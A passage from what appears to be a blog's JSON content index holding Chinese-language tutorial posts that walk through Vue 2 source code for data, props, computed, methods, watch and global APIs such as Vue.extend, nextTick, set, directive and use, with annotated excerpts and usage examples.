vm&#x27;s watcher list // this is a somewhat expensive operation so we skip it // if the vm is being destroyed. if (!this.vm._isBeingDestroyed) &#123; remove(this.vm._watchers, this); &#125; var i = this.deps.length; while (i--) &#123; this.deps[i].removeSub(this); &#125; this.active = false; &#125;&#125;;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (三) - 选项 / 数据","date":"2021-01-24T14:38:26.000Z","path":"2021/01/24/vue-learn-api-with-源码-03/","text":"data在 data 中的数据 在 vue2 中会使用 Object.defineProperty 方法监听数据变化（vue3 采用 proxy）当数据发生变化的时候，会带动页面发生变化 在使用data的时候推介使用 返回一个初始对象的函数的方法，如果 data 是一个纯粹的对象，会造成 Vue 所有实例共享同一个引用数据对象 源码1234567891011121314151617181920212223242526272829303132333435363738394041function initData (vm) &#123; var data = vm.$options.data; data = vm._data = typeof data === &#x27;function&#x27; ? getData(data, vm) : data || &#123;&#125;; if (!isPlainObject(data)) &#123; data = &#123;&#125;; warn( &#x27;data functions should return an object:\\n&#x27; + &#x27;https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function&#x27;, vm ); &#125; // proxy data on instance var keys = Object.keys(data); var props = vm.$options.props; var methods = vm.$options.methods; var i = keys.length; while (i--) &#123; var key = keys[i]; &#123; if (methods &amp;&amp; hasOwn(methods, key)) &#123; warn( (&quot;Method \\&quot;&quot; + key + &quot;\\&quot; has already been defined as a data property.&quot;), vm ); &#125; &#125; if (props &amp;&amp; hasOwn(props, key)) &#123; warn( &quot;The data property \\&quot;&quot; + key + &quot;\\&quot; is already declared as a prop. &quot; + &quot;Use prop default value instead.&quot;, vm ); &#125; else if (!isReserved(key)) &#123; proxy(vm, &quot;_data&quot;, key); &#125; &#125; // observe data observe(data, true /* asRootData */);&#125; 上述源码 主要是判断一下 data 的 类型以及判断 data 定义的变量名是否在 props 及 methods 中是否也存在，之后调用 observe 方法给 data 对象添加数据监听 123456789101112function getData (data, vm) &#123; // #7573 disable dep collection when invoking data getters pushTarget(); try &#123; return data.call(vm, vm) &#125; catch (e) &#123; handleError(e, vm, &quot;data()&quot;); return &#123;&#125; &#125; finally &#123; popTarget(); &#125;&#125; 数据映射，将 data 的数据映射到 Vue 实例上，这样我们通过 Vue.property 的方法也能访问到 data 上的数据 使用1234567export default &#123; data() &#123; return &#123; parameter: &#x27;parameter&#x27; &#125; &#125;&#125; props源码123456789101112131415161718192021222324252627282930313233function normalizeProps (options, vm) &#123; var props = options.props; if (!props) &#123; return &#125; var res = &#123;&#125;; var i, val, name; if (Array.isArray(props)) &#123; // 判断 props 类型 第一种是传递数组 [&#x27;props1&#x27;, &#x27;props2&#x27;] i = props.length; while (i--) &#123; val = props[i]; if (typeof val === &#x27;string&#x27;) &#123; name = camelize(val); res[name] = &#123; type: null &#125;; &#125; else &#123; warn(&#x27;props must be strings when using array syntax.&#x27;); &#125; &#125; &#125; else if (isPlainObject(props)) &#123; // 判断 props 类型 第二种是传递带有类型检查的对象 for (var key in props) &#123; val = props[key]; name = camelize(key); res[name] = isPlainObject(val) ? val : &#123; type: val &#125;; &#125; &#125; else &#123; warn( &quot;Invalid value for option \\&quot;props\\&quot;: expected an Array or an Object, &quot; + &quot;but got &quot; + (toRawType(props)) + &quot;.&quot;, vm ); &#125; options.props = res;&#125; 使用 props 有两种使用方式 数组方式 子组件用一个数组接收父组件传递的props props: [&#39;props1&#39;, &#39;props2&#39;]缺点就是无法做类型检查，无法控制接收到的 props 的数据类型及默认值 对象方式 子组件用一个对象接收父组件传入的props对象属性上有以下参数 type props 的数据类型，单个类型 直接判断 type: String ，多个类型 传递数组 type: [String, Array] default 默认值，如果父组件没有传递此 props，将会自动取默认值 require 是否必传 validator 自定义验证函数123456789101112export default &#123; // props: [&#x27;props1&#x27;, &#x27;props2&#x27;] props: &#123; props1: &#123; type: String, default: &#x27;&#x27;, require: true, validator: () =&gt; &#123;&#125; &#125;, props: Number &#125;&#125; propsData 使用 new 创建 Vue 实例的时候使用 源码 此源码也包含 props1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function initProps (vm, propsOptions) &#123; var propsData = vm.$options.propsData || &#123;&#125;; var props = vm._props = &#123;&#125;; // cache prop keys so that future props updates can iterate using Array // instead of dynamic object key enumeration. var keys = vm.$options._propKeys = []; var isRoot = !vm.$parent; // root instance props should be converted if (!isRoot) &#123; toggleObserving(false); &#125; var loop = function ( key ) &#123; keys.push(key); var value = validateProp(key, propsOptions, propsData, vm); /* istanbul ignore else */ &#123; var hyphenatedKey = hyphenate(key); if (isReservedAttribute(hyphenatedKey) || config.isReservedAttr(hyphenatedKey)) &#123; warn( (&quot;\\&quot;&quot; + hyphenatedKey + &quot;\\&quot; is a reserved attribute and cannot be used as component prop.&quot;), vm ); &#125; defineReactive$$1(props, key, value, function () &#123; if (!isRoot &amp;&amp; !isUpdatingChildComponent) &#123; warn( &quot;Avoid mutating a prop directly since the value will be &quot; + &quot;overwritten whenever the parent component re-renders. &quot; + &quot;Instead, use a data or computed property based on the prop&#x27;s &quot; + &quot;value. Prop being mutated: \\&quot;&quot; + key + &quot;\\&quot;&quot;, vm ); &#125; &#125;); &#125; // static props are already proxied on the component&#x27;s prototype // during Vue.extend(). We only need to proxy props defined at // instantiation here. if (!(key in vm)) &#123; proxy(vm, &quot;_props&quot;, key); &#125; &#125;; for (var key in propsOptions) loop( key ); toggleObserving(true);&#125;此方法主要是在初始化的时候 将propsData，props进行响应式处理 使用12345new Vue（&#123; propsData: &#123; msg: &#x27;123 &#125;&#125; computed源码123456789101112131415161718192021222324252627282930313233343536function initComputed (vm, computed) &#123; // 创建一个 watcher 对象 var watchers = vm._computedWatchers = Object.create(null); // 判断当前页面渲染类型 是否是服务端渲染 var isSSR = isServerRendering(); for (var key in computed) &#123; // 遍历 computed 对象 获取属性的返回值 var userDef = computed[key]; var getter = typeof userDef === &#x27;function&#x27; ? userDef : userDef.get; if (getter == null) &#123; warn( (&quot;Getter is missing for computed property \\&quot;&quot; + key + &quot;\\&quot;.&quot;), vm ); &#125; // 如果 当前页面不是服务端渲染，调用 watcher 方法监听 computed 数值变化 if (!isSSR) &#123; watchers[key] = new Watcher( vm, getter || noop, noop, computedWatcherOptions ); &#125; if (!(key in vm)) &#123; // 关键的一步，判断 computed 定义的变量在props及data中是否有值 defineComputed(vm, key, userDef); // 给 computed 的属性添加 get 方法 &#125; else &#123; if (key in vm.$data) &#123; warn((&quot;The computed property \\&quot;&quot; + key + &quot;\\&quot; is already defined in data.&quot;), vm); &#125; else if (vm.$options.props &amp;&amp; key in vm.$options.props) &#123; warn((&quot;The computed property \\&quot;&quot; + key + &quot;\\&quot; is already defined as a prop.&quot;), vm); &#125; &#125; &#125;&#125; defineComputed 函数 主要作用是设置 映射到 Vue 实例上的 computed 属性的 get 和 set 方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function defineComputed ( target, key, userDef) &#123; // 同样，首先判断一下是否是服务端渲染 var shouldCache = !isServerRendering(); if (typeof userDef === &#x27;function&#x27;) &#123; sharedPropertyDefinition.get = shouldCache ? createComputedGetter(key) : createGetterInvoker(userDef); sharedPropertyDefinition.set = noop; &#125; else &#123; sharedPropertyDefinition.get = userDef.get ? shouldCache &amp;&amp; userDef.cache !== false ? createComputedGetter(key) : createGetterInvoker(userDef.get) : noop; sharedPropertyDefinition.set = userDef.set || noop; &#125; if (sharedPropertyDefinition.set === noop) &#123; sharedPropertyDefinition.set = function () &#123; warn( (&quot;Computed property \\&quot;&quot; + key + &quot;\\&quot; was assigned to but it has no setter.&quot;), this ); &#125;; &#125; Object.defineProperty(target, key, sharedPropertyDefinition);&#125;function createComputedGetter (key) &#123; return function computedGetter () &#123; var watcher = this._computedWatchers &amp;&amp; this._computedWatchers[key]; if (watcher) &#123; if (watcher.dirty) &#123; watcher.evaluate(); &#125; if (Dep.target) &#123; watcher.depend(); &#125; return watcher.value &#125; &#125;&#125;function createGetterInvoker(fn) &#123; return function computedGetter () &#123; return fn.call(this, this) &#125;&#125; 使用123456789101112131415export default &#123; computed: &#123; parameter1() &#123; return 1 &#125;, parameter2: &#123; get() &#123; return 2 &#125;, set() &#123; this.parameter1 = 4 &#125; &#125; &#125;&#125; methods源码123456789101112131415161718192021222324252627function initMethods (vm, methods) &#123; var props = vm.$options.props; for (var key in methods) &#123; &#123; if (typeof methods[key] !== &#x27;function&#x27;) &#123; warn( &quot;Method \\&quot;&quot; + key + &quot;\\&quot; has type \\&quot;&quot; + (typeof methods[key]) + &quot;\\&quot; in the component definition. &quot; + &quot;Did you reference the function correctly?&quot;, vm ); &#125; if (props &amp;&amp; hasOwn(props, key)) &#123; warn( (&quot;Method \\&quot;&quot; + key + &quot;\\&quot; has already been defined as a prop.&quot;), vm ); &#125; if ((key in vm) &amp;&amp; isReserved(key)) &#123; warn( &quot;Method \\&quot;&quot; + key + &quot;\\&quot; conflicts with an existing Vue instance method. &quot; + &quot;Avoid defining component methods that start with _ or $.&quot; ); &#125; &#125; vm[key] = typeof methods[key] !== &#x27;function&#x27; ? noop : bind(methods[key], vm); // 调用 函数的bind 方法，绑定 methods 方法的 this 到 Vue 实例上 &#125;&#125; 使用 不推介使用箭头函数来命名 methods 函数 此时 函数的 this 指向了 父级作用域上下文12345678910export default &#123; methods: &#123; fn1() &#123; // todo... &#125;, fn2() &#123; // todo... &#125; &#125;&#125; watchVue 中 watch 主要用于监听 data，props，computed 对象中的属性发生变化，一旦发生变化就会触发对应的函数，更新对应数据及页面结构 源码12345678910111213141516171819202122232425262728function initWatch (vm, watch) &#123; for (var key in watch) &#123; var handler = watch[key]; if (Array.isArray(handler)) &#123; for (var i = 0; i &lt; handler.length; i++) &#123; createWatcher(vm, key, handler[i]); &#125; &#125; else &#123; createWatcher(vm, key, handler); &#125; &#125;&#125;function createWatcher ( vm, expOrFn, handler, options) &#123; if (isPlainObject(handler)) &#123; options = handler; handler = handler.handler; &#125; if (typeof handler === &#x27;string&#x27;) &#123; handler = vm[handler]; &#125; return vm.$watch(expOrFn, handler, options)&#125; 在 initWatch 的时候， 首先针对传入的 watch对象进行遍历watch 的属性如果是数组，数组内的函数会异议调用，其他情况会直接创建 watch vm Vue 实例 watch vue 组件上的 watch 对象 在 createWatcher 函数里面，因为传入的handler 可能是对象，所以做了兼容处理，之后要调用了 Vue 实例上的 $watch 方法来实现属性的监听, $watch 方法 我们会在接下进行讲解，现在先有个印象 vm Vue 实例 expOrFn 要进行数据监控的变量名 handler 回调函数，数据发生改变后执行此函数，吧改变后的值传递回来，也可以是对象，但是对象中必须要包含 handler 属性且是一个函数或者一个键，可以通过它在 vm 上找到对应函数 options 配置参数 针对对象进行特殊处理，防止无法监听到对象值的变化 使用在看了源码中的 initWatch 函数和 createWatcher 函数之后，根据对 watch 内部参数的处理我们可以猜到在使用 watch 的时候我们可以传递 数组、对象、函数、字符串 回调函数不推介使用 箭头函数，因为箭头函数的上下文已经绑定了，不会指向 Vue 实例 1234567891011121314151617181920export default &#123; watch: &#123; // Vue 在监控到 a 发生变化之后 会执行 methods 方法 即 vm[&#x27;methods&#x27;] a: &#x27;methods&#x27;, // Vue 在监控到 b 发生变化之后 会执行此回调函数 b: function() &#123;&#125;, // 针对对象属性监听，在 createWatcher 函数中 会对对象进行处理，取出回调函数 及 options 配置 // c 发生变化之后 会调用 对象中 handler 函数 c: &#123; handler: &#x27;methods&#x27;, deep: true &#125; // d 放生变化之后，数组中的每一个函数都会被执行，数组内部 watch 方法的执行和以上三种类似 d: [&#x27;methods&#x27;, function()&#123;&#125;, &#123; handler: function() &#123;&#125; &#125;], // 此种方法针对对象的某一个值进行监听，在 Vue 中会对 `key:&#x27;e-f&#x27; 进行处理，精准查找到 e 对象下的 f 属性 &#x27;e.f&#x27;: function() &#123;&#125; &#125;&#125;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"跟着 Vue源码学习 Vue api 系列 (二) - 全局 api","date":"2021-01-20T09:18:54.000Z","path":"2021/01/20/vue-learn-api-with-源码-02/","text":"Vue.extend({})源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980function initExtend (Vue) &#123; /** * Each instance constructor, including Vue, has a unique * cid. This enables us to create wrapped &quot;child * constructors&quot; for prototypal inheritance and cache them. */ Vue.cid = 0; var cid = 1; /** * Class inheritance */ Vue.extend = function (extendOptions) &#123; extendOptions = extendOptions || &#123;&#125;; var Super = this; // 使用 super 继承Vue 实例 var SuperId = Super.cid; // 存储 Vue 实例的 cid var cachedCtors = extendOptions._Ctor || (extendOptions._Ctor = &#123;&#125;); if (cachedCtors[SuperId]) &#123; return cachedCtors[SuperId] // 优化，如果多次使用同一个 Vue.extend 返回的是同一个 Vue.extend ,使用缓存，减少不必要的内存消耗 &#125; var name = extendOptions.name || Super.options.name; if (name) &#123; validateComponentName(name); // 检验 Vue extend 的name 属性是否合法 &#125; var Sub = function VueComponent (options) &#123; this._init(options); &#125;; /** 原型继承，将 vue 的原型 集成到子类 Sub 构造函数上，同时添加唯一标识符 */ Sub.prototype = Object.create(Super.prototype); Sub.prototype.constructor = Sub; Sub.cid = cid++; /** 调用 mergeOptions 方法 将 extend的所有属性 合并到 Vue的 options 属性上 */ Sub.options = mergeOptions( Super.options, extendOptions ); Sub[&#x27;super&#x27;] = Super; // For props and computed properties, we define the proxy getters on // the Vue instances at extension time, on the extended prototype. This // avoids Object.defineProperty calls for each instance created. // 如果包含 props 属性，重新初始化 props if (Sub.options.props) &#123; initProps$1(Sub); &#125; // 如果包含 computed 属性，重新初始化 computed if (Sub.options.computed) &#123; initComputed$1(Sub); &#125; // allow further extension/mixin/plugin usage Sub.extend = Super.extend; Sub.mixin = Super.mixin; Sub.use = Super.use; // create asset registers, so extended classes // can have their private assets too. ASSET_TYPES.forEach(function (type) &#123; Sub[type] = Super[type]; &#125;); // enable recursive self-lookup 启动递归查找 if (name) &#123; Sub.options.components[name] = Sub; &#125; // keep a reference to the super options at extension time. // later at instantiation we can check if Super&#x27;s options have // been updated. // 在分机处保留对超级选项的引用时间。稍后在实例化时，我们可以检查Super的选项是否已更新。 Sub.superOptions = Super.options; Sub.extendOptions = extendOptions; Sub.sealedOptions = extend(&#123;&#125;, Sub.options); // cache constructor cachedCtors[SuperId] = Sub; // 在此处赋值，缓存 当前 Vue extend return Sub &#125;;&#125; 通过以上源码，我们可以看出 Vue 在 extend 的时候主要做了以下几个事情 首先进行兼容处理，保证传入的对象不为空 创建一个变量 Super 用来存储 Vue 实例，并且存储 Vue 的 cid 判断当前 extend 是否已经被使用过，如果已经使用过，直接返回，以减少内存消耗 创建一个新的构造函数 Sub ，原型指向 Super 的原型，并创建一个唯一的 cid 接下来通过 mergeOptions 方法，将传入的 参数 与 Vue 实例的 options(data,lifeCycle,methods,props,methods 等) 合并，遵循 Vue 内部 config 中定义的optionMergeStrategies 配置 初始化 props 和 computed 属性 重新对 extend，mixin，use，filter，directive，component 属性进行赋值 最后 通过 _Ctor 缓存 当前创建的 Vue.extend 实例 返回 当前 Sub 构造函数，该构造函数 具有 Vue 所有属性及方法 使用 1234567891011121314151617181920212223var Profile = Vue.extend(&#123; data() &#123; return &#123; name: &#x27;lxx&#x27;, age: 24, &#125; &#125;, computed: &#123; time() &#123; return new Date.getTime() &#125; &#125;, mounted() &#123; this.getName() &#125; methods: &#123; getName() &#123; console.log(this.name) &#125; &#125;&#125;)new Profile().$mount(&#x27;#app&#x27;) 当我们 使用 Vue.extend 为 Vue 扩展一些信息的时候，会根据 Vue 的 optionMergeStrategies 配置的默认属性合并规则进行属性 合并，这样我们在任意组件都可以使用到这些属性和方法 Vue.nextTick([callback: Function,context: Object]) Vue 更新页面并不是同步更新的，而是采用异步更新的。 浏览器有一个更新循环 tick，这个 tick 时间间隔大概十几毫秒，Vue 在到浏览器执行下一个 tick 的时间段内搜集所有需要更新的 Dom 数据，在 下一个 tick 循环到来的时候同步更新到页面上。这时候就会造成一个问题，如果我们想在改变数据之后立刻获取页面的数据的话，这时候还没有触发浏览器的 tick 更新，页面没有变化，我们是获取不到更新后的 DOM 数据 使用 Vue.nextTick 可以使我们在页面更新完成之后获取 DOM 源码123456789101112131415161718192021222324function nextTick (cb, ctx) &#123; var _resolve; callbacks.push(function () &#123; if (cb) &#123; try &#123; cb.call(ctx); &#125; catch (e) &#123; handleError(e, ctx, &#x27;nextTick&#x27;); &#125; &#125; else if (_resolve) &#123; _resolve(ctx); &#125; &#125;); if (!pending) &#123; pending = true; timerFunc(); &#125; // $flow-disable-line if (!cb &amp;&amp; typeof Promise !== &#x27;undefined&#x27;) &#123; return new Promise(function (resolve) &#123; _resolve = resolve; &#125;) &#125;&#125; 在 timerFunc() 函数 中 通过判断 Promise MutationObserver 及 setImmediate函数是否存在 如在就使用对应函数，不存在就使用setTimeout方法 使用123Vue.nextTick(() =&gt; &#123; // 获取更新后的 Dom&#125;) Vue.set(target: Object | Array, index: Number | string, value: any) 用于修改一些 Vue 响应式无法监听到的对象属性变更，同时触发视图更新 源码123456789101112131415161718192021222324252627282930function set (target, key, val) &#123; if (isUndef(target) || isPrimitive(target) ) &#123; warn((&quot;Cannot set reactive property on undefined, null, or primitive value: &quot; + ((target)))); &#125; if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) &#123; target.length = Math.max(target.length, key); target.splice(key, 1, val); return val &#125; if (key in target &amp;&amp; !(key in Object.prototype)) &#123; target[key] = val; return val &#125; var ob = (target).__ob__; if (target._isVue || (ob &amp;&amp; ob.vmCount)) &#123; warn( &#x27;Avoid adding reactive properties to a Vue instance or its root $data &#x27; + &#x27;at runtime - declare it upfront in the data option.&#x27; ); return val &#125; if (!ob) &#123; target[key] = val; return val &#125; defineReactive$$1(ob.value, key, val); ob.dep.notify(); return val&#125; 首先判断传过来的 target 是否存在，及数据类型是否是基本数据类型 判断 target 是否是数组，以及 key 值 是否可用，然后调用 Array 的 slice 方法替换数组数据 判断 key 是否属于 target 判断 传入 target 对象 是否是 Vue 实例 调用 defineReactive$$1 监听数据变化 调用 发布订阅模式 的 发布方法 使用1Vue.set(target, key, value) Vue.delete(target: Object | Array, index: Number | string) 删除对象的 property。如果对象是响应式的，确保删除能触发更新视图。这个方法主要用于避开 Vue 不能检测到 property 被删除的限制，但是你应该很少会使用它。 源码1234567891011121314151617181920212223242526function del (target, key) &#123; if (isUndef(target) || isPrimitive(target) ) &#123; warn((&quot;Cannot delete reactive property on undefined, null, or primitive value: &quot; + ((target)))); &#125; if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) &#123; target.splice(key, 1); return &#125; var ob = (target).__ob__; if (target._isVue || (ob &amp;&amp; ob.vmCount)) &#123; warn( &#x27;Avoid deleting properties on a Vue instance or its root $data &#x27; + &#x27;- just set it to null.&#x27; ); return &#125; if (!hasOwn(target, key)) &#123; return &#125; delete target[key]; if (!ob) &#123; return &#125; ob.dep.notify(); &#125; 首先判断传过来的 target 是否存在，及数据类型是否是基本数据类型 判断 target 是否是数组，以及 key 值 是否可用，然后调用 Array 的 slice 方法替换数组数据 判断 传入 target 对象 是否是 Vue 实例 删除 target[key] 调用 发布订阅模式 的 发布方法 使用1Vue.delete(target, key) Vue.directive( id: string, [definition]: Function | Object ) 此方法主要是为了给 Vue 设置自定义指令 及获取 Vue 指令 源码首先 定义了一个 platformDirectives 存储 directive 指令的属性，然后通过 extend 方法，将 platformDirectives 上的属性 复制到 Vue.options.directives 上123456var platformDirectives = &#123; model: directive, show: show&#125;;extend(Vue.options.directives, platformDirectives) directive 对象的属性 12345var directive = &#123; inserted: function() &#123;&#125;, componentUpdated: function()&#123;&#125;&#125; install12345678910111213141516171819202122232425262728inserted: function inserted (el, binding, vnode, oldVnode) &#123; if (vnode.tag === &#x27;select&#x27;) &#123; // #6903 if (oldVnode.elm &amp;&amp; !oldVnode.elm._vOptions) &#123; mergeVNodeHook(vnode, &#x27;postpatch&#x27;, function () &#123; directive.componentUpdated(el, binding, vnode); &#125;); &#125; else &#123; setSelected(el, binding, vnode.context); &#125; el._vOptions = [].map.call(el.options, getValue); &#125; else if (vnode.tag === &#x27;textarea&#x27; || isTextInputType(el.type)) &#123; el._vModifiers = binding.modifiers; if (!binding.modifiers.lazy) &#123; el.addEventListener(&#x27;compositionstart&#x27;, onCompositionStart); el.addEventListener(&#x27;compositionend&#x27;, onCompositionEnd); // Safari &lt; 10.2 &amp; UIWebView doesn&#x27;t fire compositionend when // switching focus before confirming composition choice // this also fixes the issue where some browsers e.g. iOS Chrome // fires &quot;change&quot; instead of &quot;input&quot; on autocomplete. el.addEventListener(&#x27;change&#x27;, onCompositionEnd); /* istanbul ignore if */ if (isIE9) &#123; el.vmodel = true; &#125; &#125; &#125;&#125;, 我们可以看到在 inserted 函数中对 指令绑定的元素做了一个判断， 针对 select，textarea标签及 input 标签且属性是 是文本输入类型的元素做了特殊处理 componentUpdated 123456789101112131415161718192021componentUpdated: function componentUpdated (el, binding, vnode) &#123; if (vnode.tag === &#x27;select&#x27;) &#123; setSelected(el, binding, vnode.context); // in case the options rendered by v-for have changed, // it&#x27;s possible that the value is out-of-sync with the rendered options. // detect such cases and filter out values that no longer has a matching // option in the DOM. var prevOptions = el._vOptions; var curOptions = el._vOptions = [].map.call(el.options, getValue); if (curOptions.some(function (o, i) &#123; return !looseEqual(o, prevOptions[i]); &#125;)) &#123; // trigger change event if // no matching option found for at least one value var needReset = el.multiple ? binding.value.some(function (v) &#123; return hasNoMatchingOption(v, curOptions); &#125;) : binding.value !== binding.oldValue &amp;&amp; hasNoMatchingOption(binding.value, curOptions); if (needReset) &#123; trigger(el, &#x27;change&#x27;); &#125; &#125; &#125;&#125; 在 componentUpdated 方法中 对select 标签的元素做了特殊处理，渲染其子元素 option bind,update,unbind 针对元素的 display 进行处理 使用insert 函数传入参数有四个 el 当前指令挂载的元素节点 binding v-[name]:[arg].[modifies].[modifies]=&quot;[expression]&quot; name: 指令名 value: 指令的绑定值 oldValue: 指令绑定的前一个值，value参数改变之前的值 expression: 字符串形式的指令表达式 arg: 传递指令的参数 modifiers: 包含修饰符的对象 首先 如果 express 没有话 不会获取到 value, 如果想要获取 value，就要包含有 expression, 则该 expression 必须在 data 或者 computed 上必须要在第一层上 就算是 expression 用 ex1.ex2 或者 ex1[ex2],value 的值为 data[ex1] 或者 computed[ex1] 当 expression 为一个可以计算的表达式的时候 例如 1+1, ex1 + 1 等，value 的结果为 expression 计算之后的结果 vnode 虚拟node节点 oldVnode 上一个虚拟 DOM 节点 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;div id=&quot;app&quot;&gt; &lt;div&gt;this is test for directive&lt;/div&gt; &lt;div v-test:test2.test1=&quot;test3&quot;&gt;&#123;&#123;test3&#125;&#125;&lt;/div&gt; &lt;/div&gt; &lt;script&gt; Vue.directive(&#x27;test&#x27;, &#123; bind: function(el, binding, vnode, oldValue) &#123; console.log(el,binding,vnode,oldValue) /** el: &lt;div&gt;4&lt;/div&gt; binding: arg: &quot;test2&quot; def: &#123;bind: ƒ, componentUpdated: ƒ&#125; expression: &quot;test3&quot; modifiers: &#123;test1: true&#125; name: &quot;test&quot; rawName: &quot;v-test:test2.test1&quot; value: 4 vnode VNode&#123;&#125; oldValue VNode&#123;&#125; */ &#125;, // 使用 componentUpdated 可以监控元素节点数据变化 展示的 更新之后的数据 componentUpdated:function(el, binding, vnode, oldValue) &#123; console.log(el,binding,vnode,oldValue) /** el: &lt;div&gt;9&lt;/div&gt; binding: arg: &quot;test2&quot; def: &#123;bind: ƒ, componentUpdated: ƒ&#125; expression: &quot;test3&quot; modifiers: &#123;test1: true&#125; name: &quot;test&quot; rawName: &quot;v-test:test2.test1&quot; value: 9 vnode VNode&#123;&#125; oldValue VNode&#123;&#125; // 此处存放的是 value 未被更改为4的时候的节点 */ &#125;, // 在元素bind的时候 可能updated方法就已经执行， // 此时 bind时候 的el对象是更新之后的对象,即 testChild 为 8 test3 为 9 // 但是 Vnode 及 oldVNode 还是元素未发生更改之前的元素节点 updated:function(el, binding, vnode, oldValue) &#123; console.log(el,binding,vnode,oldValue, &#x27;updated&#x27;) &#125;, // 指令解绑的时候触发 可以使用 v-if 控制元素隐藏和显示来触发 unbid unbind: function(el, binding, vnode, oldValue) &#123; console.log(el,binding,vnode,oldValue, &#x27;unbind&#x27;) &#125;, // 页面一渲染就会触发 insert: function(el, binding, vnode, oldValue) &#123; console.log(el,binding,vnode,oldValue, &#x27;insert&#x27;) &#125;, &#125;) var app = new Vue(&#123; el: &quot;#app&quot;, data: () =&gt; &#123; return &#123; test3: 4, testChild: 4 &#125; &#125;, mounted() &#123; setTimeout(() =&gt; &#123; this.test3 = 9, this.testChild = 8 &#125;, 1000) &#125;, &#125;) &lt;/script&gt; Vue.filter(id:string, definition: Function)源码123456789101112131415161718192021222324252627282930var ASSET_TYPES = [ &#x27;component&#x27;, &#x27;directive&#x27;, &#x27;filter&#x27;];ASSET_TYPES.forEach(function (type) &#123; Vue[type] = function ( id, definition ) &#123; if (!definition) &#123; return this.options[type + &#x27;s&#x27;][id] &#125; else &#123; /* istanbul ignore if */ if (type === &#x27;component&#x27;) &#123; validateComponentName(id); &#125; if (type === &#x27;component&#x27; &amp;&amp; isPlainObject(definition)) &#123; definition.name = definition.name || id; definition = this.options._base.extend(definition); &#125; if (type === &#x27;directive&#x27; &amp;&amp; typeof definition === &#x27;function&#x27;) &#123; definition = &#123; bind: definition, update: definition &#125;; &#125; this.options[type + &#x27;s&#x27;][id] = definition; return definition &#125; &#125;; &#125;);&#125; 以上代码 是 ‘component’, ‘directive’, ‘filter’ 三个全局API 注册到 Vue 实例上的方法 如果是 component 则检查 组件名称是否是合格的组件名称 然后在判断 是否是 definition 参数是否是对象，如果是，则使用 Vue 实例的 extend 方法扩展全局的 extend 属性 如果是 directive 如果传入的 definition 是函数 则默认调用 bind 和 update 方法 使用123456&lt;div&gt;&#123;&#123; test | uppcase&#125;&#125;&lt;div&gt;&lt;script&gt;Vue.filter(&#x27;uppcase&#x27;, function(value) &#123; return value &amp;&amp; value.toUpperCase()&#125;&lt;/script&gt; Vue.component(id: string, definition: Function | Object)源码请查看 Vue.filter 的讲解 使用12345Vue.componet(&#x27;my-component&#x27;, &#123; data() &#123;return &#123;&#125;&#125; methods: &#123;&#125; computed: &#123;&#125;&#125;) definition 可以传递 Vue.extend({}),也可以直接传一个对象，Vue会自动调用 Vue.extend 方法 Vue.use(plugin)源码12345678910111213141516171819function initUse (Vue) &#123; Vue.use = function (plugin) &#123; var installedPlugins = (this._installedPlugins || (this._installedPlugins = [])); if (installedPlugins.indexOf(plugin) &gt; -1) &#123; // 判断是否 安装过此插件 return this &#125; // additional parameters var args = toArray(arguments, 1); args.unshift(this); if (typeof plugin.install === &#x27;function&#x27;) &#123; plugin.install.apply(plugin, args); // 调用 plugin 的 install 函数 &#125; else if (typeof plugin === &#x27;function&#x27;) &#123; plugin.apply(null, args); // 直接执行 plugin 函数 &#125; installedPlugins.push(plugin); return this &#125;;&#125; 使用12// plugin必须是一个函数 或者包含 install 的对象 Vue.use(plugin) Vue.mixin(plugin)源码123456function initMixin$1 (Vue) &#123; Vue.mixin = function (mixin) &#123; this.options = mergeOptions(this.options, mixin); return this &#125;;&#125; 此方法 调用了 mergeOptions 方法将 传入的参数 与 Vue 的 options 属性合并 使用 这个方法会影响 所有创建的 Vue 组件，不推介使用，但是可以用于 optionMergeStrategies 自定义 选项12345678910111213Vue.mixin(&#123; created: function () &#123; var myOption = this.$options.myOption if (myOption) &#123; console.log(myOption) &#125; &#125;&#125;)new Vue(&#123; myOption: &#x27;hello!&#x27;&#125;)// =&gt; &quot;hello!&quot; Vue.compile将一个模板字符串编译成 render 函数 源码没看懂，有时间再来研究(2021-01-24)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798function createCompileToFunctionFn (compile) &#123; var cache = Object.create(null); return function compileToFunctions ( template, options, vm ) &#123; options = extend(&#123;&#125;, options); var warn$$1 = options.warn || warn; delete options.warn; /* istanbul ignore if */ &#123; // detect possible CSP restriction try &#123; new Function(&#x27;return 1&#x27;); &#125; catch (e) &#123; if (e.toString().match(/unsafe-eval|CSP/)) &#123; warn$$1( &#x27;It seems you are using the standalone build of Vue.js in an &#x27; + &#x27;environment with Content Security Policy that prohibits unsafe-eval. &#x27; + &#x27;The template compiler cannot work in this environment. Consider &#x27; + &#x27;relaxing the policy to allow unsafe-eval or pre-compiling your &#x27; + &#x27;templates into render functions.&#x27; ); &#125; &#125; &#125; // check cache var key = options.delimiters ? String(options.delimiters) + template : template; if (cache[key]) &#123; return cache[key] &#125; // compile var compiled = compile(template, options); // check compilation errors/tips &#123; if (compiled.errors &amp;&amp; compiled.errors.length) &#123; if (options.outputSourceRange) &#123; compiled.errors.forEach(function (e) &#123; warn$$1( &quot;Error compiling template:\\n\\n&quot; + (e.msg) + &quot;\\n\\n&quot; + generateCodeFrame(template, e.start, e.end), vm ); &#125;); &#125; else &#123; warn$$1( &quot;Error compiling template:\\n\\n&quot; + template + &quot;\\n\\n&quot; + compiled.errors.map(function (e) &#123; return (&quot;- &quot; + e); &#125;).join(&#x27;\\n&#x27;) + &#x27;\\n&#x27;, vm ); &#125; &#125; 